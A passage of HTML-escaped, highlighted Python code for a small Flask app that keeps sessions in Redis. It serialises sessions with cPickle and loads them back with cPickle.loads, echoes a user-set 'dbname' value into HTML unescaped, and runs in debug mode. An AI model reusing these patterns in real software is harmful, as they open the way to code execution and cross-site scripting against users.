      &lt;span class=&quot;n&quot;&gt;CallbackDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sid&lt;/span&gt;
      &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modified&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#########################################################################################
# Session interface is responsible for handling logic related to sessions
# i.e. storing, saving, etc
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RedisSessionInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SessionInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;# Init connection
&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6379&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
      &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StrictRedis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;

   &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open_session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;# Get session id from the cookie
&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_cookie_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;# If id is given (session was created)
&lt;/span&gt;      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
         &lt;span class=&quot;c1&quot;&gt;# Try to load a session from Redisdb
&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;stored_session&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;ssstr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;stored_session&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stored_session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# Check if the session isn't expired
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stored_session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'expiration'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;utcnow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
               &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RedisSession&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;initial&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stored_session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'data'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
                              &lt;span class=&quot;n&quot;&gt;sid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stored_session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'sid'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
      
      &lt;span class=&quot;c1&quot;&gt;# If there was no session or it was expired...
&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;# Generate a random id and create an empty session
&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uuid4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RedisSession&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

   &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;save_session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;domain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_cookie_domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;# We're requested to delete the session
&lt;/span&gt;      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delete_cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_cookie_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;# Refresh the session expiration time
&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;# First, use get_expiration_time from SessionInterface
&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;# If it fails, add 1 hour to current time
&lt;/span&gt;      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_expiration_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;expiration&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_expiration_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;expiration&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;utcnow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timedelta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hours&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;# Update the Redis document, where sid equals to session.sid
&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;ssd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
         &lt;span class=&quot;s&quot;&gt;'sid'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;s&quot;&gt;'data'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;s&quot;&gt;'expiration'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;expiration&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;ssstr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;# Refresh the cookie
&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_cookie_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                     &lt;span class=&quot;n&quot;&gt;expires&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_expiration_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
                     &lt;span class=&quot;n&quot;&gt;httponly&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#########################################################################################
# Create an application
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_interface&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RedisSessionInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;permanent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'refreshed'&lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'refreshed'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

   &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;You refreshed the page %d times&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'refreshed'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&amp;lt;br/&amp;gt;&amp;lt;a href=&quot;/kill&quot;&amp;gt;Reset&amp;lt;/a&amp;gt;'&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&amp;lt;br/&amp;gt;dbname=&quot;%s&quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'dbname'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'NULL'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'refreshed'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'refreshed'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/dbset/&amp;lt;dbname&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dbset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'dbname'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dbname&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'index'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/kill&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;kill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'index'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
